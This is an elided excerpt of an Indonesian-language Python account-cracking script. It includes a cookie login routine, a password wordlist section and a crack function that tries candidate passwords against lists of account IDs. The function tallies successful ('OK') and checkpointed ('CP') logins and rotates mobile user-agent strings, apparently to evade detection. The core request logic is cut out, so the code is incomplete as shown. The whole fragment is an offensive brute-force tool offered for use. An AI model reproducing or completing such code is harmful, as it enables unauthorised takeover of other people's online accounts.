...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tHallo Resyah : [green]Cookiedough[white]'))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menahan Berak {m}•{k}•{h}•{x} <<<<< ')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[{h}!{x}] RESYAH16 {h}{P}{b}{loop}{P}/{u}{len(id)}{P} {H}OK:{P}{ok}{P} {k}CP:{P}{cp}{x}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	...
	#ua = random.choice(['Mozilla/5.0 (Linux; Android 11; TECNO KG5j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 11; SM-A705GM Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 OPR/64.0.2254.62635','Mozilla/5.0 (Linux; Android 10; itel W5006X Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36','Mozilla/5.0 (Linux; arm; Android 10; LRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 YaBrowser/22.7.2.91.00 SA/3 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Primo F9 Build/PPR1.181008.011;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; Infinix X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Edg/103.0.1264.77'])
	ses = requests.Session()
	for pw in pwv:
		try:
